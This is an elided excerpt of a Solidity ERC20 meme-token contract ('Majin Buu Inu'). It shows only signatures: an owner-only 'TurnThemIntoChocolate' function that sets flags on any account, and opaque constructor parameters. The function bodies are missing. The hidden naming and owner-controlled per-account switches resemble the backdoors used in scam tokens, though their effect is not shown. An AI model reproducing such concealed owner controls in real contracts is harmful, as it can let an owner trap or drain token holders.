...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function TurnThemIntoChocolate(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _feedingEnergyToEgg(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Majin is Context, ERC20 {
    constructor(
        ...
        _feedingEnergyToEgg(owner, initialSupply, tmp6, tmp7);
    }
}

contract MajinBuuInu is ERC20Majin {
    constructor() ERC20Majin("Majin Buu Inu", "MAJINBUU", false, true, 1000, 25, msg.sender, 300000000 * 10 ** 18, msg.sender, 14) {
    }
}